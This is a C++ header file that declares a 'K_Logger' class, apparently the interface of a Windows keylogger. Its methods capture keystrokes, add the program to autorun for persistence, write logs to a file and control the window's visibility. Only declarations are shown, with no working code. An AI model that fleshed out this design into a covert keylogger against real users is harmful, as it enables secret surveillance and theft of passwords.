#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/



#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>
#include <stdio.h>



using std::fstream;
using std::cout;
using std::endl;
using std::string;


class K_Logger
{
public:
	int SaveSymbol(WORD iKey);
	void AddToAutorun();

private:
	void WriteToDoc(const LPCSTR text);

protected:
	void VisibilityApp();
}; 
